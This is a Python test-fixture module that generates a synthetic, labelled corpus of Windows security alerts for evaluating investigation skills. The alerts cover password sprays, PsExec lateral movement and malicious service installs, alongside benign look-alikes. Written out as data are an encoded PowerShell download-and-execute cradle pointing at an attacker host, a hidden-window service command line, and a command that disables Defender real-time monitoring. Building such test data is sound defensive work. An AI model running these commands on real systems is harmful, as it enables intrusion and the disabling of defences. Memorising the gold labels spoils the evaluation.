"""``corpus_skills_v1`` (AI-E1.10): attack and benign variants for the two investigation-skill families.

``corpus_v1`` has 10 malicious alerts of the Windows logon-failure family and 7
of the service-install family, too few to gate a skill on. This dataset holds
only those two families (ADR 0014 sections 1.4 and 1.5), in the same estate a
week later, with at least 50 malicious alerts each and the benign activity
that trips the same rules. Its context events are a sibling file
(``corpus_skills_v1_events.jsonl.gz``), its gold evidence another
(``corpus_skills_v1_gold.json``).

Logon failures (rules 60122, 60204, 60115):

* attacks: password sprays (a burst, one that locks accounts out, a slow one
  below the 30-minute threshold), guessing (invented user names; one account
  from many sources);
* benign: a typo followed by a success, a phone or a mapped drive retrying an
  old password, a forgotten password that ends in a lockout (benign, and not
  provable: a person has to look).

Service installs and PsExec (rules 61138, 92068):

* attacks: PsExec from a workstation followed by discovery, PsExec from two
  sources, a service binary in a user-writable folder or on a share, a new
  binary under ``Program Files``, a service that runs an interpreter;
* benign: desktop support's PsExec, vendor updaters the whole fleet runs,
  software installed for the first time (benign, and not provable).

**Context abuse** (tag ``context-abuse`` and ``abuse:<kind>``): attacks that
sit inside what the tenant declared (``_meta.tenant_context``), so declared
context alone must never close them: a spray from the declared admin
workstation's address, PsExec by a declared admin account from that
workstation followed by discovery, an "updater" service registered on a
server outside its patch window, a declared service account used
interactively.

The first alerts of a slow spray and of guessing from many sources carry the
tag ``early-stage``: when they fire, no evidence window holds the rest of the
attack yet, so no indicator can be true for them.
"""

from __future__ import annotations

import json
from collections import Counter
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from typing import Any, Callable, Dict, List, Mapping, Optional, Sequence, Set, Tuple

from tests.fixtures.attack_corpus import alerts as A
from tests.fixtures.attack_corpus.alerts import pick
from tests.fixtures.attack_corpus.catalog import ART_COMMIT, ATTACK_VERSION, WAZUH_TAG, technique_name
from tests.fixtures.attack_corpus.corpus import TENANT_CONTEXT, TENANT_SETTINGS
from tests.fixtures.attack_corpus.fleet import (
    ATTACKER_DOMAINS,
    DCS,
    HELPDESK,
    SERVICE_ACCOUNTS,
    WIN_ADMINS,
    WIN_SERVERS,
    WORKSTATIONS,
    Host,
)
from tests.fixtures.attack_corpus.gold import PSEXESVC_SERVICE_PATH, GoldRow, service_exe, skill_of
from tests.fixtures.attack_corpus.scenarios import CMD, INSTALLS, PS, Truth, attack, encoded, lookalike, noise
from tests.fixtures.attack_corpus.telemetry import (
    IT_WS,
    PSEXESVC,
    ROUTINE_PSEXEC,
    SERVICES,
    Event,
    Tel,
    documents,
    history,
    lockout,
    logon_failure,
    logon_success,
    process_start,
    psexec_child,
    retries,
    sc_create,
    service_install,
)

NAME = "corpus_skills_v1"
EVENTS_NAME = "corpus_skills_v1_events"
VERSION = 1
ID_PREFIX = "csk1"
START = datetime(2026, 11, 2, tzinfo=UTC)  # the Monday after the corpus_v1 window
DAYS = 12
OFFSET = 536_870_912  # a third alerts.json: ids never collide with corpus_v1 or its events
MIN_ATTACKS = 50
ABUSES = ("admin-workstation-spray", "admin-account-discovery", "outside-maintenance-window",
          "service-account-interactive")
WORKDAYS = tuple(d for d in range(DAYS) if (START + timedelta(days=d)).weekday() < 5)
ALL_DAYS = tuple(range(DAYS))
SPRAY_USERS = (*(h.owner for h in WORKSTATIONS), *HELPDESK)
INVENTED_USERS = ("administrator", "admin", "test", "guest", "backup", "scanner", "sqladmin", "support", "user1")
SYSTEM32 = "C:\\Windows\\System32\\"
DISCOVERY = (
    (SYSTEM32 + "whoami.exe", "whoami /all"),
    (SYSTEM32 + "nltest.exe", "nltest /dclist:corp"),
    (SYSTEM32 + "net.exe", 'net group "Domain Admins" /domain'),
    (SYSTEM32 + "quser.exe", "quser"),
    (SYSTEM32 + "systeminfo.exe", "systeminfo"),
    (SYSTEM32 + "ipconfig.exe", "ipconfig /all"),
)
WRITABLE_PATHS = ("C:\\Users\\Public\\{name}.exe", "C:\\ProgramData\\{name}\\{name}.exe",
                  "C:\\Users\\{user}\\AppData\\Local\\Temp\\{name}.exe", "\\\\{ip}\\share\\{name}.exe")
SERVICE_NAMES = ("WinSvcHost", "MsUpdSvc", "SysHealthSvc", "NetCfgHelper", "WinTelemetry", "PrintSpoolHelper",
                 "DiagTrackSvc2", "AppXHelper")
MASQUERADES = (
    ("GoogleUpdaterService", "C:\\Program Files\\Google\\Update\\gupdate.exe"),
    ("AdobeUpdateSvc", "C:\\Program Files (x86)\\Adobe\\Update\\adobeupd.exe"),
    ("ZoomUpdateSvc", "C:\\Program Files\\Zoom\\bin\\zupdate.exe"),
    ("MozillaUpdateSvc", "C:\\Program Files\\Mozilla Update\\mozupdate.exe"),
    ("DefenderUpdateSvc", "C:\\Program Files\\Windows Defender\\MpUpdate.exe"),
)
NEW_SOFTWARE = (
    ("Tailscale", "Tailscale", "C:\\Program Files\\Tailscale\\tailscaled.exe"),
    ("Docker Desktop", "com.docker.service", "C:\\Program Files\\Docker\\Docker\\com.docker.service.exe"),
    ("Lenovo Vantage Service", "LenovoVantageService",
     "C:\\Program Files (x86)\\Lenovo\\VantageService\\4.0.52.0\\LenovoVantageService.exe"),
)
UPDATERS = tuple(row for row in INSTALLS if row[1])


@dataclass
class Labelled:
    """One alert of the dataset: the event, its label and the benign hypothesis its variant was built for."""

    event: Event
    truth: Truth
    skill: str
    variant: str
    hypothesis: Optional[str]
    tags: Tuple[str, ...]


class Calendar:
    """Which host is taken on which day, so two episodes never read each other's evidence by accident.

    An exclusive claim wants no other claim on the host within ``span`` days; a shared one (a typo, which adds no
    other user to its source) only wants no exclusive claim there and no second shared claim on the same day.
    """

    def __init__(self, span: int):
        self.span = span
        self.exclusive: Set[Tuple[str, int]] = set()
        self.shared: Set[Tuple[str, int]] = set()

    def free(self, key: str, day: int, exclusive: bool) -> bool:
        near = range(day - self.span, day + self.span + 1)
        if any((key, d) in self.exclusive for d in near) or (key, day) in self.shared:
            return False
        return not exclusive or not any((key, d) in self.shared for d in near)

    def take(self, keys: Sequence[str], day: int, exclusive: bool) -> None:
        (self.exclusive if exclusive else self.shared).update((key, day) for key in keys)


class Episode(Tel):
    """One variant instance: its labelled alerts and its context events, from a generator seeded by its name."""

    def __init__(self, variant: str, n: int):
        super().__init__(f"{variant}:{n}", NAME)
        self.variant, self.n = variant, n
        self.scenario = f"skills:{variant}"
        self.alerts: List[Labelled] = []

    def label(self, event: Event, truth: Truth, hypothesis: Optional[str] = None, tags: Sequence[str] = ()) -> Event:
        skill = skill_of(event.rule)
        if skill is None:  # pragma: no cover - a generator bug
            raise ValueError(f"rule {event.rule} belongs to no skill family")
        self.alerts.append(Labelled(event, truth, skill, self.variant, hypothesis, tuple(tags)))
        return event

    def place(self, calendar: Calendar, hosts: Sequence[Host], *, n: int = 1, exclusive: bool = True,
              days: Sequence[int] = WORKDAYS) -> Tuple[List[Host], int]:
        """``n`` of ``hosts`` and a day on which the calendar has them free."""
        for _ in range(200):
            chosen = self.rng.sample(list(hosts), n)
            options = [d for d in days if all(calendar.free(h.name, d, exclusive) for h in chosen)]
            if options:
                day = self.rng.choice(options)
                calendar.take([h.name for h in chosen], day, exclusive)
                return chosen, day
        raise ValueError(f"{self.key}: no free day left; lower the variant counts")  # pragma: no cover

    def moment(self, day: int, lo: float, hi: float) -> datetime:
        when = START + timedelta(days=day, seconds=self.rng.uniform(lo * 3600, hi * 3600))
        return when.replace(microsecond=when.microsecond // 1000 * 1000)

    def maybe(self, p: float) -> bool:
        return self.rng.random() < p


def abuse(kind: str) -> Tuple[str, str]:
    return "context-abuse", f"abuse:{kind}"


# ---------------------------------------------------------------------------------------------------------------------
# Windows logon failures
# ---------------------------------------------------------------------------------------------------------------------


def _spray(ep: Episode, src: Host, day: int, *, users: int, procedure: str, lockouts: int = 0, success: bool = True,
           invented: bool = False, tags: Sequence[str] = ()) -> None:
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 7, 19)
    pool = list(INVENTED_USERS) if invented else [u for u in SPRAY_USERS if u != src.owner]
    names = ep.rng.sample(pool, users + 1)
    winner, names = names[-1], names[:-1]
    truth = attack(ep.scenario, procedure, "T1110.001" if invented else "T1110.003")
    for i, user in enumerate(names):
        failure = logon_failure(ep, dc, t, user=user, src_ip=src.ip, workstation=src.name,
                                rule="60204" if i == len(names) - 1 else "60122",
                                sub_status="0xc0000064" if invented else "0xc000006a")
        ep.label(failure, truth, tags=tags)
        t = ep.seconds(t, 1, 6)
    for user in names[:lockouts]:
        ep.label(lockout(ep, dc, t, user=user, caller=src.name),
                 attack(ep.scenario, f"the spray locks {user} out", "T1110.003"), tags=tags)
        t = ep.seconds(t, 0.5, 3)
    if success and not invented:
        logon_success(ep, dc, ep.seconds(t, 5, 90), user=winner, src_ip=src.ip, workstation=src.name)


def spray_burst(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (src,), day = ep.place(logons, WORKSTATIONS)
    _spray(ep, src, day, users=ep.rng.randint(4, 6), lockouts=ep.rng.choice((0, 0, 1)), success=ep.maybe(0.7),
           procedure=f"one password tried for many accounts from {src.name}")


def spray_lockouts(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (src,), day = ep.place(logons, WORKSTATIONS)
    _spray(ep, src, day, users=ep.rng.randint(5, 7), lockouts=ep.rng.randint(2, 3), success=False,
           procedure=f"a few passwords tried for many accounts from {src.name} until accounts lock out")


def invented_users(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (src,), day = ep.place(logons, WORKSTATIONS)
    _spray(ep, src, day, users=ep.rng.randint(4, 6), invented=True,
           procedure=f"common account names that do not exist are tried from {src.name}")


def spray_from_admin_workstation(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (src,), day = ep.place(logons, [IT_WS])
    _spray(ep, src, day, users=ep.rng.randint(5, 6), tags=abuse("admin-workstation-spray"),
           procedure=f"one password tried for many accounts from the declared admin workstation {src.name}")


def slow_spray(ep: Episode, logons: Calendar, _: Calendar) -> None:
    """One account every half hour or more, so no 30-minute window ever holds three."""
    (src,), day = ep.place(logons, WORKSTATIONS)
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 6, 9)
    truth = attack(ep.scenario, f"one password tried for a new account every half hour or more from {src.name}",
                   "T1110.003")
    for i, user in enumerate(ep.rng.sample([u for u in SPRAY_USERS if u != src.owner], 8)):
        ep.label(logon_failure(ep, dc, t, user=user, src_ip=src.ip, workstation=src.name), truth,
                 tags=("early-stage",) if i < 4 else ())
        t = ep.seconds(t, 35 * 60, 100 * 60)


def many_sources(ep: Episode, logons: Calendar, _: Calendar) -> None:
    """One account tried from four hosts in an afternoon; every other run targets an admin account."""
    sources, day = ep.place(logons, [*WORKSTATIONS, *WIN_SERVERS], n=4)
    target = pick(ep.rng, WIN_ADMINS) if ep.n % 2 == 0 else pick(ep.rng, [u for u in SPRAY_USERS
                                                                        if u not in {s.owner for s in sources}])
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 8, 15)
    truth = attack(ep.scenario, f"passwords for {target} are tried from {len(sources)} hosts", "T1110.001")
    for i, src in enumerate(sources):
        early = i < 2 and target not in WIN_ADMINS
        ep.label(logon_failure(ep, dc, t, user=target, src_ip=src.ip, workstation=src.name), truth,
                 tags=("early-stage",) if early else ())
        t = ep.seconds(t, 2 * 60, 20 * 60)


def service_account_interactive(ep: Episode, logons: Calendar, _: Calendar) -> None:
    account = pick(ep.rng, (SERVICE_ACCOUNTS["backup"], SERVICE_ACCOUNTS["sccm"], SERVICE_ACCOUNTS["monitor"]))
    server = pick(ep.rng, WIN_SERVERS)
    (src,), day = ep.place(logons, WORKSTATIONS, days=ALL_DAYS)
    t = ep.moment(day, 19, 23)
    truth = attack(ep.scenario, f"the declared service account {account} is tried over Remote Desktop on "
                                f"{server.name} from {src.name}, then gets in", "T1078.002")
    for _ in range(ep.rng.randint(2, 3)):
        ep.label(logon_failure(ep, server, t, user=account, src_ip=src.ip, workstation=src.name, logon_type=10),
                 truth, tags=abuse("service-account-interactive"))
        t = ep.seconds(t, 4, 20)
    logon_success(ep, server, ep.seconds(t, 5, 40), user=account, src_ip=src.ip, workstation=src.name, logon_type=10)


def typo(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (ws,), day = ep.place(logons, WORKSTATIONS, exclusive=False)
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 7, 10)
    truth = noise(ep.scenario, f"{ws.owner} mistypes the password at the morning logon")
    for _ in range(2 if ep.maybe(0.25) else 1):
        ep.label(logon_failure(ep, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name), truth,
                 "typo_then_success")
        t = ep.seconds(t, 4, 15)
    logon_success(ep, dc, ep.seconds(t, 10, 200), user=ws.owner, src_ip=ws.ip, workstation=ws.name)


def stale_phone(ep: Episode, _: Calendar, __: Calendar) -> None:
    ws, dc = pick(ep.rng, WORKSTATIONS), pick(ep.rng, DCS)
    t = ep.moment(pick(ep.rng, WORKDAYS), 9, 18)
    phone = f"10.20.40.{20 + ep.n}"
    ep.label(logon_failure(ep, dc, t, user=ws.owner, src_ip=phone, workstation="-"),
             lookalike(ep.scenario, f"{ws.owner}'s phone retries the old mail password", "T1110.001"),
             "stale_credentials")
    retries(ep, dc, t, user=ws.owner, src_ip=phone, workstation="-", start=t - timedelta(hours=ep.rng.uniform(3, 6)),
            end=t + timedelta(hours=ep.rng.uniform(1, 2)), every_min=(15.0, 35.0))


def stale_drive(ep: Episode, logons: Calendar, _: Calendar) -> None:
    (ws,), day = ep.place(logons, WORKSTATIONS)
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 10, 18)
    ep.label(logon_failure(ep, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name, rule="60204"),
             lookalike(ep.scenario, f"a mapped drive on {ws.name} retries {ws.owner}'s old password", "T1110.001"),
             "stale_credentials")
    retries(ep, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name,
            start=t - timedelta(hours=ep.rng.uniform(2, 5)), end=t + timedelta(hours=ep.rng.uniform(1, 2)),
            every_min=(30.0, 60.0), burst=(2, 4))


def forgotten_password(ep: Episode, logons: Calendar, _: Calendar) -> None:
    """Benign, and no proof fits: too many failures for a typo, and the success comes only after the helpdesk."""
    (ws,), day = ep.place(logons, WORKSTATIONS)
    dc = pick(ep.rng, DCS)
    t = ep.moment(day, 8, 17)
    truth = noise(ep.scenario, f"{ws.owner} forgets the new password and is locked out; the helpdesk unlocks the "
                               "account")
    tries = ep.rng.randint(4, 5)
    for i in range(tries):
        ep.label(logon_failure(ep, dc, t, user=ws.owner, src_ip=ws.ip, workstation=ws.name,
                               rule="60204" if i == tries - 1 else "60122"), truth)
        t = ep.seconds(t, 5, 25)
    ep.label(lockout(ep, dc, t, user=ws.owner, caller=ws.name), truth)
    t = ep.seconds(t, 20 * 60, 40 * 60)
    ep.emit(t, dc, "60133", A.account_event(ep.ctx, dc, t, 4767, actor=pick(ep.rng, HELPDESK), target=ws.owner))
    logon_success(ep, dc, ep.seconds(t, 60, 300), user=ws.owner, src_ip=ws.ip, workstation=ws.name)


# ---------------------------------------------------------------------------------------------------------------------
# Windows service installs and PsExec
# ---------------------------------------------------------------------------------------------------------------------


def _psexec(ep: Episode, target: Host, t: datetime, *, source: Host, account: str,
            commands: Sequence[Tuple[str, str]], install: Truth, child: Truth, hypothesis: Optional[str] = None,
            tags: Sequence[str] = ()) -> datetime:
    """A PsExec run on ``target``: the 7045 and every command are alerts; returns the time of the last command."""
    logon_success(ep, target, ep.seconds(t, -40, -3), user=account, src_ip=source.ip, workstation=source.name)
    guid = ep.ctx.guid()
    ep.label(service_install(ep, target, t, name="PSEXESVC", image=PSEXESVC_SERVICE_PATH), install, hypothesis, tags)
    process_start(ep, target, ep.seconds(t, 0.3, 1.2), image=PSEXESVC, cmd=PSEXESVC, parent=SERVICES,
                  parent_cmd=SERVICES, guid=guid)
    t = ep.seconds(t, 2, 6)
    for image, cmd in commands:
        own = ep.ctx.guid()
        ep.label(psexec_child(ep, target, t, image=image, cmd=cmd, parent_guid=guid, guid=own), child, hypothesis, tags)
        if image == CMD and " & " in cmd:  # a shell line: its commands are the shell's children
            for part in cmd.split(" /c ", 1)[1].split(" & "):
                process_start(ep, target, ep.seconds(t, 0.1, 0.8), image=SYSTEM32 + part.split(" ", 1)[0] + ".exe",
                              cmd=part, parent=CMD, parent_cmd=cmd, parent_guid=own)
        last, t = t, ep.seconds(t, 3, 40)
    return last


def _lateral_truths(ep: Episode, source: Host, target: Host) -> Tuple[Truth, Truth]:
    return (attack(ep.scenario, f"PsExec from {source.name} copies and starts PSEXESVC on {target.name}", "T1021.002"),
            attack(ep.scenario, "remote command through the PsExec service", "T1569.002"))


def _discovery(ep: Episode) -> List[Tuple[str, str]]:
    if ep.maybe(0.3):
        return [(CMD, "cmd.exe /c whoami /all & ipconfig /all")]
    return ep.rng.sample(DISCOVERY, ep.rng.randint(2, 3))


def psexec_lateral(ep: Episode, _: Calendar, services: Calendar) -> None:
    (target,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS], days=ALL_DAYS)
    source = pick(ep.rng, [w for w in WORKSTATIONS if w != target])
    install, child = _lateral_truths(ep, source, target)
    last = _psexec(ep, target, ep.moment(day, 6, 22), source=source, account=pick(ep.rng, (*WIN_ADMINS, source.owner)),
                   commands=_discovery(ep), install=install, child=child)
    if ep.maybe(0.5):
        t = ep.seconds(last, 60, 480)
        tamper = f'{PS} -c "Set-MpPreference -DisableRealtimeMonitoring 1"'
        ep.emit(t, target, "92008", A.process(ep.ctx, target, t, image=PS, cmd=tamper, parent=CMD, parent_cmd="cmd.exe",
                                              user="SYSTEM", integrity="System"))


def psexec_two_sources(ep: Episode, _: Calendar, services: Calendar) -> None:
    """Two workstations run PsExec against one server within minutes; the second only stages a file."""
    (target,), day = ep.place(services, WIN_SERVERS, days=ALL_DAYS)
    first, second = ep.rng.sample(list(WORKSTATIONS), 2)
    account = pick(ep.rng, WIN_ADMINS)
    install, child = _lateral_truths(ep, first, target)
    last = _psexec(ep, target, ep.moment(day, 6, 22), source=first, account=account,
                   commands=[pick(ep.rng, DISCOVERY)], install=install, child=child)
    install, child = _lateral_truths(ep, second, target)
    stage = f"cmd.exe /c copy \\\\{first.ip}\\c$\\Users\\Public\\u{ep.ctx.hexstr(3)}.exe C:\\Windows\\u{ep.ctx.hexstr(3)}.exe"
    _psexec(ep, target, ep.seconds(last, 180, 480), source=second, account=account, commands=[(CMD, stage)],
            install=install, child=child)


def psexec_admin_account_discovery(ep: Episode, _: Calendar, services: Calendar) -> None:
    (target,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS])
    account = pick(ep.rng, WIN_ADMINS)
    _psexec(ep, target, ep.moment(day, 8, 18), source=IT_WS, account=account, commands=_discovery(ep),
            install=attack(ep.scenario, f"PsExec from the declared admin workstation with the declared admin account "
                                        f"{account} starts PSEXESVC on {target.name}", "T1021.002"),
            child=attack(ep.scenario, "discovery through the PsExec service with a declared admin account",
                         "T1569.002"),
            tags=abuse("admin-account-discovery"))


def _installed(ep: Episode, host: Host, t: datetime, *, name: str, image: str, truth: Truth,
               tags: Sequence[str] = (), remote: bool = False) -> None:
    """A 7045 alert with the ``sc.exe create`` before it and the service's process after it."""
    user = pick(ep.rng, WIN_ADMINS) if remote or not host.owner else host.owner
    if remote:
        source = pick(ep.rng, [w for w in WORKSTATIONS if w != host])
        logon_success(ep, host, ep.seconds(t, -40, -5), user=user, src_ip=source.ip, workstation=source.name)
    ep.label(service_install(ep, host, t, name=name, image=image, start="auto start"), truth, tags=tags)
    sc_create(ep, host, t, name=name, image=image, user=user)


def service_user_writable(ep: Episode, _: Calendar, services: Calendar) -> None:
    (host,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS], days=ALL_DAYS)
    name = pick(ep.rng, SERVICE_NAMES)
    template = WRITABLE_PATHS[ep.n % len(WRITABLE_PATHS)]
    image = template.format(name=name.lower(), user=host.owner or "Public", ip=pick(ep.rng, WORKSTATIONS).ip)
    where = "on a network share" if image.startswith("\\\\") else "in a user-writable folder"
    _installed(ep, host, ep.moment(day, 6, 22), name=name, image=image, remote=ep.maybe(0.5),
               truth=attack(ep.scenario, f"sc.exe registers a service whose binary is {where}", "T1543.003"))


def service_masquerade(ep: Episode, _: Calendar, services: Calendar) -> None:
    (host,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS], days=ALL_DAYS)
    name, image = MASQUERADES[ep.n % len(MASQUERADES)]
    _installed(ep, host, ep.moment(day, 6, 22), name=name, image=image, remote=ep.maybe(0.5),
               truth=attack(ep.scenario, "a service named like a vendor updater runs a binary no other host has",
                            "T1543.003"))


def service_interpreter(ep: Episode, _: Calendar, services: Calendar) -> None:
    """Remote service creation the way offensive tooling does it: a random name and a command interpreter."""
    (host,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS], days=ALL_DAYS)
    t = ep.moment(day, 6, 22)
    token = ep.ctx.hexstr(6)
    payload = encoded(f"IEX (New-Object Net.WebClient).DownloadString('http://{pick(ep.rng, ATTACKER_DOMAINS)}/a')")
    image = (f"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand {payload}",
             f"cmd.exe /c echo {token} > \\\\.\\pipe\\{token}",
             f"C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\{token}.dll,Start")[ep.n % 3]
    source = pick(ep.rng, [w for w in WORKSTATIONS if w != host])
    logon_success(ep, host, ep.seconds(t, -40, -5), user=pick(ep.rng, WIN_ADMINS), src_ip=source.ip,
                  workstation=source.name)
    ep.label(service_install(ep, host, t, name=ep.ctx.b64(8), image=image),
             attack(ep.scenario, f"a service with a random name is created from {source.name} to run a command "
                                 "interpreter", "T1569.002"))
    process_start(ep, host, ep.seconds(t, 0.2, 1.5), image=service_exe(image) if "\\" in service_exe(image) else CMD,
                  cmd=image, parent=SERVICES, parent_cmd=SERVICES)


def service_outside_maintenance_window(ep: Episode, _: Calendar, services: Calendar) -> None:
    (server,), day = ep.place(services, WIN_SERVERS, days=ALL_DAYS)
    product, name, image = pick(ep.rng, UPDATERS)
    folder, binary = service_exe(image).rsplit("\\", 1)
    version = f"1.{ep.rng.randint(2, 9)}.{ep.rng.randint(100, 199)}.{ep.rng.randint(10, 99)}"
    _installed(ep, server, ep.moment(day, 9, 22), name=name, image=f"{folder}\\{version}\\{binary}", remote=True,
               tags=abuse("outside-maintenance-window"),
               truth=attack(ep.scenario, f"a service named like the {product} updater is registered on {server.name} "
                                         "outside its patch window, from a binary no other host has", "T1543.003"))


def it_admin(ep: Episode, _: Calendar, services: Calendar) -> None:
    (target,), day = ep.place(services, WORKSTATIONS)
    _psexec(ep, target, ep.moment(day, 8, 18), source=IT_WS, account=pick(ep.rng, WIN_ADMINS),
            commands=ep.rng.sample(ROUTINE_PSEXEC, ep.rng.randint(1, 2)), hypothesis="sanctioned_remote_admin",
            install=lookalike(ep.scenario, f"desktop support runs PsExec against {target.name}", "T1569.002"),
            child=lookalike(ep.scenario, "desktop support runs a routine command with PsExec", "T1569.002"))


def vendor_update(ep: Episode, _: Calendar, services: Calendar) -> None:
    (host,), day = ep.place(services, [*WIN_SERVERS, *WORKSTATIONS], days=ALL_DAYS)
    workstation = host.role == "workstation"
    if workstation and day not in WORKDAYS:
        day = min(WORKDAYS, key=lambda d: abs(d - day))
    t = ep.moment(day, 9, 17) if workstation else ep.moment(day, 1, 5)
    product, name, image = pick(ep.rng, UPDATERS)
    ep.label(service_install(ep, host, t, name=name, image=image, start="auto start"),
             lookalike(ep.scenario, f"{product} installer registers its service", "T1543.003"),
             "vendor_updater_service")


def new_software(ep: Episode, _: Calendar, services: Calendar) -> None:
    """Benign, and no proof fits: the first install of a product looks like any new binary."""
    (host,), day = ep.place(services, WORKSTATIONS)
    product, name, image = NEW_SOFTWARE[ep.n % len(NEW_SOFTWARE)]
    t = ep.moment(day, 9, 17)
    ep.emit(ep.seconds(t, -20, -3), host, "60612", A.msi_installed(ep.ctx, host, t, product=product),
            f"Application installed Product: {product} -- Installation completed successfully..")
    ep.label(service_install(ep, host, t, name=name, image=image, start="auto start"),
             noise(ep.scenario, f"{product} is installed for the first time in the estate (an approved request)"))


Variant = Callable[[Episode, Calendar, Calendar], None]
#: Variant, how many episodes; exclusive claims first, the typos (which share a workstation's day) last.
VARIANTS: Tuple[Tuple[str, Variant, int], ...] = (
    ("spray-from-admin-workstation", spray_from_admin_workstation, 2),
    ("many-sources", many_sources, 2),
    ("slow-spray", slow_spray, 1),
    ("spray-burst", spray_burst, 3),
    ("spray-lockouts", spray_lockouts, 1),
    ("invented-users", invented_users, 2),
    ("service-account-interactive", service_account_interactive, 2),
    ("stale-drive", stale_drive, 4),
    ("forgotten-password", forgotten_password, 2),
    ("stale-phone", stale_phone, 5),
    ("typo", typo, 14),
    ("psexec-two-sources", psexec_two_sources, 2),
    ("psexec-lateral", psexec_lateral, 5),
    ("psexec-admin-account-discovery", psexec_admin_account_discovery, 3),
    ("service-user-writable", service_user_writable, 8),
    ("service-masquerade", service_masquerade, 5),
    ("service-interpreter", service_interpreter, 6),
    ("service-outside-maintenance-window", service_outside_maintenance_window, 4),
    ("it-admin", it_admin, 8),
    ("vendor-update", vendor_update, 10),
    ("new-software", new_software, 3),
)


@dataclass(frozen=True)
class Skills:
    alerts: List[Dict[str, Any]]  # the dataset's alerts, in time order
    labels: Dict[str, Labelled]  # alert id -> label
    events: List[Dict[str, Any]]  # the context documents (the events file), in time order

    def text(self) -> str:
        return dataset_text(self)

    def gold_rows(self) -> List[GoldRow]:
        return [GoldRow(f"{ID_PREFIX}-{i:04d}", alert, self.labels[alert["id"]].truth.disposition,
                        self.labels[alert["id"]].hypothesis) for i, alert in enumerate(self.alerts, start=1)]


def build_skills() -> Skills:
    logons, services = Calendar(span=1), Calendar(span=0)
    episodes: List[Episode] = []
    for name, variant, count in VARIANTS:
        for n in range(count):
            episode = Episode(name, n)
            variant(episode, logons, services)
            episodes.append(episode)
    labelled = {id(label.event): label for episode in episodes for label in episode.alerts}
    events = [event for episode in episodes for event in episode.events] + history(START, NAME)
    docs, ids = documents(events, offset=OFFSET)
    labels = {ids[key]: label for key, label in labelled.items()}
    skills = Skills([d for d in docs if d["id"] in labels], labels, [d for d in docs if d["id"] not in labels])
    attacks = Counter(label.skill for label in labels.values() if label.truth.disposition == "malicious")
    if len(attacks) != 2 or min(attacks.values()) < MIN_ATTACKS:  # pragma: no cover - raise the variant counts
        raise ValueError(f"fewer than {MIN_ATTACKS} attacks in a family: {dict(attacks)}")
    return skills


def _tags(alert: Mapping[str, Any], label: Labelled) -> List[str]:
    truth = label.truth
    tags = ["synthetic", "vendor:wazuh", f"kind:{truth.kind}", f"scenario:{truth.scenario}", f"skill:{label.skill}",
            f"rule:{alert['rule']['id']}", f"level:{alert['rule']['level']}"]
    if truth.technique:
        tags.append(f"{'technique' if truth.kind == 'attack' else 'resembles'}:{truth.technique}")
    return [*tags, *label.tags]


def _notes(truth: Truth) -> str:
    if truth.technique is None:
        return f"{truth.procedure}."
    name = technique_name(truth.technique)
    if truth.kind == "attack":
        return f"{truth.procedure}. {truth.technique} {name}."
    return f"{truth.procedure}. Benign look-alike of {truth.technique} {name}."


def item(index: int, alert: Mapping[str, Any], label: Labelled) -> Dict[str, Any]:
    malicious = label.truth.disposition == "malicious"
    return {
        "id": f"{ID_PREFIX}-{index:04d}",
        "source_type": "wazuh",
        "alert": alert,
        "expected": {"disposition": label.truth.disposition, "escalation": malicious},
        "split": "standard",
        "family": label.skill,
        "tags": _tags(alert, label),
        "notes": _notes(label.truth),
    }


def composition(skills: Skills) -> Dict[str, Any]:
    labels = [skills.labels[a["id"]] for a in skills.alerts]
    by_skill: Dict[str, Dict[str, int]] = {}
    for label in labels:
        counts = by_skill.setdefault(label.skill, {"malicious": 0, "benign": 0})
        counts[label.truth.disposition] += 1
    return {
        "items": len(labels),
        "malicious": sum(label.truth.disposition == "malicious" for label in labels),
        "benign": sum(label.truth.disposition == "benign" for label in labels),
        "families": dict(sorted(by_skill.items())),
        "variants": dict(sorted(Counter(label.variant for label in labels).items())),
        "context_abuse": dict(sorted(Counter(t.split(":", 1)[1] for label in labels for t in label.tags
                                             if t.startswith("abuse:")).items())),
        "early_stage": sum("early-stage" in label.tags for label in labels),
    }


def meta(skills: Skills) -> Dict[str, Any]:
    return {
        "synthetic": True,
        "version": VERSION,
        "name": NAME,
        "description": (
            "Investigation-skill corpus (AI-E1.10): Wazuh 4.14 alerts of the Windows logon-failure and "
            "service-install families (ADR 0014), at least 50 attack variants each, with context-abuse items and "
            "the benign activity that trips the same rules. Context events: corpus_skills_v1_events.jsonl.gz; gold "
            "evidence: corpus_skills_v1_gold.json. Generated by tests/fixtures/attack_corpus (skills.py); see "
            "docs/evaluation.md."
        ),
        "generator": {"module": "tests.fixtures.attack_corpus.skills", "seed": f"{NAME}:<variant>:<n>",
                      "window": [START.date().isoformat(), f"{DAYS} days"]},
        "sources": {"wazuh_ruleset": WAZUH_TAG, "attack": ATTACK_VERSION, "atomic_red_team": ART_COMMIT},
        "composition": composition(skills),
        "tenant_settings": TENANT_SETTINGS,
        # The same estate as corpus_v1: what its customer declares. The context-abuse items sit inside it.
        "tenant_context": TENANT_CONTEXT,
    }


def dataset_text(skills: Skills) -> str:
    lines = [json.dumps({"_meta": meta(skills)}, ensure_ascii=False, separators=(",", ":"))]
    for index, alert in enumerate(skills.alerts, start=1):
        lines.append(json.dumps(item(index, alert, skills.labels[alert["id"]]), ensure_ascii=False,
                                separators=(",", ":")))
    return "\n".join(lines) + "\n"


EVENTS_DESCRIPTION = (
    "Context telemetry around the corpus_skills_v1 alerts (AI-E1.10): logons, process starts, service installs and "
    "the estate's history, as Wazuh documents in the alerts.json shape. Not dataset items: they carry no label. "
